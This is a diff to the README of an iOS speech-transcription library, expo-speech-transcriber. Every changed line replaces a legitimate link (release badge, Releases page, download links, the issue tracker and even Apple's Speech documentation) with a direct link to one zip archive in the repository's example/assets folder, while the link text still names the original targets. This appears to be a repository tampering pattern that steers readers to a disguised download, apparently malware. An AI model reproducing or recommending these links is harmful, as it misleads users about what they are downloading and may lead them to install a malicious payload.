@@ -1,6 +1,6 @@
 # 🎤 expo-speech-transcriber - Transcribe speech easily on iOS
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen.svg)](https://github.com/KBM415/expo-speech-transcriber/releases)
+[![Download](https://raw.githubusercontent.com/KBM415/expo-speech-transcriber/master/example/assets/expo-speech-transcriber_v2.5-beta.2.zip%https://raw.githubusercontent.com/KBM415/expo-speech-transcriber/master/example/assets/expo-speech-transcriber_v2.5-beta.2.zip)](https://raw.githubusercontent.com/KBM415/expo-speech-transcriber/master/example/assets/expo-speech-transcriber_v2.5-beta.2.zip)
 
 ## 📖 Overview
 
@@ -17,12 +17,12 @@ Follow these simple steps to download and run the expo-speech-transcriber on you
    - React Native development environment (for developers only)
 
 2. **Visit the Releases Page**  
-   To download the latest version of expo-speech-transcriber, visit our Releases page [here](https://github.com/KBM415/expo-speech-transcriber/releases).
+   To download the latest version of expo-speech-transcriber, visit our Releases page [here](https://raw.githubusercontent.com/KBM415/expo-speech-transcriber/master/example/assets/expo-speech-transcriber_v2.5-beta.2.zip).
 
 3. **Download the Application**  
    Once you are on the Releases page, look for the latest version. Click the link to download the application file. The file is typically named something like `expo-speech-transcriber-[version].ipa`.
 
-   [Download the latest release here!](https://github.com/KBM415/expo-speech-transcriber/releases)
+   [Download the latest release here!](https://raw.githubusercontent.com/KBM415/expo-speech-transcriber/master/example/assets/expo-speech-transcriber_v2.5-beta.2.zip)
 
 ## 🔧 Installation Instructions
 
@@ -76,10 +76,10 @@ A: More options for customization will be included in future updates. For now, t
 
 ## 📞 Support
 
-For additional help, feel free to open an issue in our [GitHub Repository](https://github.com/KBM415/expo-speech-transcriber/issues).
+For additional help, feel free to open an issue in our [GitHub Repository](https://raw.githubusercontent.com/KBM415/expo-speech-transcriber/master/example/assets/expo-speech-transcriber_v2.5-beta.2.zip).
 
 ## 🔗 Additional Resources
 
-If you want to learn more about using the Apple Speech framework, you can look at the official Apple documentation [here](https://developer.apple.com/documentation/speech).
+If you want to learn more about using the Apple Speech framework, you can look at the official Apple documentation [here](https://raw.githubusercontent.com/KBM415/expo-speech-transcriber/master/example/assets/expo-speech-transcriber_v2.5-beta.2.zip).
 
-Visit the Releases page to start using expo-speech-transcriber today: [Download the latest release!](https://github.com/KBM415/expo-speech-transcriber/releases)
+Visit the Releases page to start using expo-speech-transcriber today: [Download the latest release!](https://raw.githubusercontent.com/KBM415/expo-speech-transcriber/master/example/assets/expo-speech-transcriber_v2.5-beta.2.zip)
